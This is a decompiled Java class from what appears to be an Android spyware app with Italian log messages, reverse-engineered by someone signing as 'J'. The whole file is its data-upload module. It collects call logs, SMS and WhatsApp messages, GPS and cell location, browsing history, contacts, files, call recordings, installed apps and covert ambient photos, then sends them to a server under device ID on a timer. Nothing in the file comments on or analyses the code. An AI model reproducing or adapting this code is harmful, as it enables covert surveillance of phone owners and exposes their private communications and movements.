package com.app.system.common.f;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.app.system.common.d.a.p;
import com.app.system.common.entity.DataLog;
import com.security.ServiceSettings;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.List;

public class a
{
  public static int a(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences("gps", 0);
      long l1 = paramContext.getLong("last_gps_time", 0L);
      long l2 = paramContext.getLong("gps-interval", 300L);
      paramContext = new java/util/Date;
      paramContext.<init>();
      long l3 = paramContext.getTime() / 1000L;
      if ((l1 != 0L) && (l3 - l1 < l2)) {
        return -2;
      }
      return 1;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendData", paramContext.getMessage(), new Object[0]);
      paramContext.printStackTrace();
    }
    return -2;
  }
  
  private static void a(Context paramContext, DataLog paramDataLog)
  {
    paramContext = paramContext.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
    if (paramContext != null)
    {
      int i = paramContext.getIntExtra("level", -1);
      int j = paramContext.getIntExtra("scale", -1);
      double d1 = i;
      double d2 = j;
      Double.isNaN(d1);
      Double.isNaN(d2);
      paramDataLog.batteryLevel = ((int)(d1 / d2 * 100.0D));
      int k = paramContext.getIntExtra("status", -1);
      boolean bool;
      if ((k != 2) && (k != 5)) {
        bool = false;
      } else {
        bool = true;
      }
      paramDataLog.batteryCharging = bool;
      com.security.d.a.d("SendData", String.format("Battery level=%d, scale=%d, status=%d", new Object[] { Integer.valueOf(i), Integer.valueOf(j), Integer.valueOf(k) }), new Object[0]);
    }
    else
    {
      com.security.d.a.a("SendData", "Failed getting BATTERY STATUS!", new Object[0]);
    }
  }
  
  public static int b(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences("pref", 0);
      long l1 = paramContext.getLong("last_sync_time", 0L);
      long l2 = paramContext.getLong("send-to-server-interval", 300L);
      paramContext = new java/util/Date;
      paramContext.<init>();
      long l3 = paramContext.getTime() / 1000L;
      if ((l1 != 0L) && (l3 - l1 < l2)) {
        return 0;
      }
      return 1;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendData", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
  
  public static int c(Context paramContext)
  {
    int i = 0;
    int j;
    try
    {
      p localp = new com/app/system/common/d/a/p;
      localp.<init>(null, com.app.system.common.h.c(paramContext));
      j = localp.b(paramContext);
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendData", paramContext.getMessage(), new Object[0]);
      j = i;
    }
    return j;
  }
  
  public static int d(Context paramContext)
  {
    int i = 0;
    int j;
    try
    {
      p localp = new com/app/system/common/d/a/p;
      localp.<init>(null, com.app.system.common.h.c(paramContext));
      j = localp.c(paramContext);
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendData", paramContext.getMessage(), new Object[0]);
      j = i;
    }
    return j;
  }
  
  public static void e(Context paramContext)
  {
    try
    {
      SharedPreferences localSharedPreferences = paramContext.getSharedPreferences("pref", 0);
      boolean bool1 = localSharedPreferences.getBoolean("sms-active", false);
      boolean bool2 = localSharedPreferences.getBoolean("call-active", false);
      localSharedPreferences.getBoolean("url-active", false);
      if (bool2) {
        d.a(paramContext, paramContext.getSharedPreferences("pref", 0).getLong("last-call-date", 0L));
      }
      if (bool1) {
        o.a(paramContext, paramContext.getSharedPreferences("pref", 0).getLong("last-sms-date", 0L));
      }
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendData", paramContext.getMessage(), new Object[0]);
    }
  }
  
  public static int f(Context paramContext)
  {
    try
    {
      paramContext.getSharedPreferences("pref", 0);
      com.app.system.common.h.d locald = new com/app/system/common/h/d;
      locald.<init>(paramContext);
      com.app.system.common.h.k localk = new com/app/system/common/h/k;
      localk.<init>(paramContext);
      com.app.system.common.h.n localn = new com/app/system/common/h/n;
      localn.<init>(paramContext);
      com.app.system.common.h.h localh = new com/app/system/common/h/h;
      localh.<init>(paramContext);
      com.app.system.common.h.e locale = new com/app/system/common/h/e;
      locale.<init>(paramContext);
      DataLog localDataLog = new com/app/system/common/entity/DataLog;
      localDataLog.<init>();
      a(paramContext, localDataLog);
      Object localObject1 = ServiceSettings.a();
      Object localObject2;
      Object localObject3;
      if (((ServiceSettings)localObject1).callListActive)
      {
        localObject2 = locald.a(null, null, 25);
        localDataLog.callData = ((List)localObject2);
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        ((StringBuilder)localObject3).append("Total call log: ");
        ((StringBuilder)localObject3).append(((List)localObject2).size());
        com.security.d.a.d("SendData", ((StringBuilder)localObject3).toString(), new Object[0]);
      }
      else
      {
        localObject2 = new java/util/ArrayList;
        ((ArrayList)localObject2).<init>();
        com.security.d.a.d("SendData", "LISTA CHIAMATE NON ATTIVA", new Object[0]);
      }
      Object localObject4;
      if (((ServiceSettings)localObject1).gpsAndCellsActive)
      {
        localObject3 = localh.a(null, null);
        localDataLog.gpsData = ((List)localObject3);
        localObject4 = new java/lang/StringBuilder;
        ((StringBuilder)localObject4).<init>();
        ((StringBuilder)localObject4).append("Total gps log: ");
        ((StringBuilder)localObject4).append(((List)localObject3).size());
        com.security.d.a.d("SendData", ((StringBuilder)localObject4).toString(), new Object[0]);
      }
      else
      {
        localObject3 = new java/util/ArrayList;
        ((ArrayList)localObject3).<init>();
        com.security.d.a.d("SendData", "GPS NON ATTIVO", new Object[0]);
      }
      Object localObject5;
      if (((ServiceSettings)localObject1).gpsAndCellsActive)
      {
        localObject4 = locale.c();
        localDataLog.cellInfo = ((List)localObject4);
        localObject5 = new java/lang/StringBuilder;
        ((StringBuilder)localObject5).<init>();
        ((StringBuilder)localObject5).append("Total cell info log: ");
        ((StringBuilder)localObject5).append(((List)localObject4).size());
        com.security.d.a.d("SendData", ((StringBuilder)localObject5).toString(), new Object[0]);
      }
      else
      {
        localObject4 = new java/util/ArrayList;
        ((ArrayList)localObject4).<init>();
        com.security.d.a.d("SendData", "CELLE NON ATTIVE", new Object[0]);
      }
      Object localObject6;
      if (((ServiceSettings)localObject1).urlActive)
      {
        localObject5 = localn.a(null, null, 25);
        localDataLog.urlData = ((List)localObject5);
        localObject6 = new java/lang/StringBuilder;
        ((StringBuilder)localObject6).<init>();
        ((StringBuilder)localObject6).append("Total url log: ");
        ((StringBuilder)localObject6).append(((List)localObject5).size());
        com.security.d.a.d("SendData", ((StringBuilder)localObject6).toString(), new Object[0]);
      }
      else
      {
        localObject5 = new java/util/ArrayList;
        ((ArrayList)localObject5).<init>();
        com.security.d.a.d("SendData", "LISTA URN NON ATTIVI", new Object[0]);
      }
      if ((!((ServiceSettings)localObject1).smsActive) && (!((ServiceSettings)localObject1).whatsappActive) && (!((ServiceSettings)localObject1).whatsappDbActive))
      {
        localObject6 = new java/util/ArrayList;
        ((ArrayList)localObject6).<init>();
        com.security.d.a.d("SendData", "SMS NON ATTIVI", new Object[0]);
      }
      else
      {
        localObject6 = localk.a(null, null, 25, 0);
        localDataLog.smsData = ((List)localObject6);
        localObject7 = new java/lang/StringBuilder;
        ((StringBuilder)localObject7).<init>();
        ((StringBuilder)localObject7).append("Total messages log: ");
        ((StringBuilder)localObject7).append(((List)localObject6).size());
        com.security.d.a.d("SendData", ((StringBuilder)localObject7).toString(), new Object[0]);
      }
      if (((ServiceSettings)localObject1).whatsappActive)
      {
        localObject1 = localk.a(null, null, 25, 1);
        localObject7 = new java/lang/StringBuilder;
        ((StringBuilder)localObject7).<init>();
        ((StringBuilder)localObject7).append("Total whatsapp messages log: ");
        ((StringBuilder)localObject7).append(((List)localObject1).size());
        com.security.d.a.d("SendData", ((StringBuilder)localObject7).toString(), new Object[0]);
        ((List)localObject6).addAll((Collection)localObject1);
      }
      else
      {
        com.security.d.a.d("SendData", "WHATASPP RT NON ATTIVO", new Object[0]);
      }
      localObject1 = com.app.system.common.h.c(paramContext);
      localDataLog.deviceId = ((String)localObject1);
      Object localObject7 = new java/lang/StringBuilder;
      ((StringBuilder)localObject7).<init>();
      ((StringBuilder)localObject7).append("Total message: ");
      if (localDataLog.smsData != null) {
        i = localDataLog.smsData.size();
      } else {
        i = 0;
      }
      ((StringBuilder)localObject7).append(i);
      com.security.d.a.d("SendData", ((StringBuilder)localObject7).toString(), new Object[0]);
      localObject7 = new com/app/system/common/d/a/a;
      ((com.app.system.common.d.a.a)localObject7).<init>(null, (String)localObject1);
      int i = ((com.app.system.common.d.a.a)localObject7).a(paramContext, localDataLog);
      if (i > 0)
      {
        if ((((List)localObject2).size() > 0) && ((i & 0x20) != 0)) {
          locald.a((List)localObject2);
        }
        if ((((List)localObject6).size() > 0) && ((i & 0x100) != 0)) {
          localk.a((List)localObject6);
        }
        if ((((List)localObject3).size() > 0) && ((i & 0x100) != 0)) {
          localh.a((List)localObject3);
        }
        if ((((List)localObject4).size() > 0) && ((i & 0x10) != 0)) {
          locale.a((List)localObject4);
        }
        if ((((List)localObject5).size() > 0) && ((i & 0x200) != 0)) {
          localn.a((List)localObject5);
        } else {}
      }
      return 0;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendData", paramContext.getMessage(), new Object[0]);
    }
    return 100;
  }
  
  public static int g(Context paramContext)
  {
    try
    {
      Thread localThread = new java/lang/Thread;
      Runnable local1 = new com/app/system/common/f/a$1;
      local1.<init>(paramContext);
      localThread.<init>(local1);
      localThread.start();
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendData", paramContext.getMessage(), new Object[0]);
      paramContext.printStackTrace();
    }
    return 1;
  }
  
  public static void h(Context paramContext)
  {
    try
    {
      Thread localThread = new java/lang/Thread;
      Runnable local2 = new com/app/system/common/f/a$2;
      local2.<init>(paramContext);
      localThread.<init>(local2);
      localThread.start();
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendData", paramContext.getMessage(), new Object[0]);
      paramContext.printStackTrace();
    }
  }
  
  public static boolean i(Context paramContext)
  {
    try
    {
      c(paramContext);
      if (!com.app.system.common.h.b(paramContext))
      {
        com.security.d.a.a("SendData", "firstSyncAndFlushData: IMEI NON VALIDO", new Object[0]);
        return false;
      }
      f(paramContext);
      return true;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return false;
  }
  
  public static int j(Context paramContext)
  {
    com.security.d.a.d("SendData", "Flush all data run", new Object[0]);
    paramContext.getSharedPreferences("pref", 0);
    if ((com.app.system.common.h.b(paramContext)) && (com.app.system.common.b.b(paramContext)))
    {
      g(paramContext);
      if (ServiceSettings.a().contactsActive) {
        e.n(paramContext);
      } else {
        com.security.d.a.d("SendData", "INVIO CONTATTI NON ABILITATO", new Object[0]);
      }
      if (ServiceSettings.a().filesActive) {
        j.k(paramContext);
      }
      if (ServiceSettings.a().callRecActive) {
        m.m(paramContext);
      }
      if (ServiceSettings.a().smsActive) {
        o.a(paramContext, paramContext.getSharedPreferences("pref", 0).getLong("last-sms-date", 0L));
      }
      if (ServiceSettings.a().filesActive) {
        g.k(paramContext);
      }
      if (ServiceSettings.a().appListActive) {
        c.k(paramContext);
      }
      l.k(paramContext);
      if (ServiceSettings.a().ambPhotoActive) {
        k.a(paramContext);
      }
      b.a(paramContext);
      n.a(paramContext);
      i.a(paramContext, false);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/f/a.class
 *
 * Reversed by:           J
 */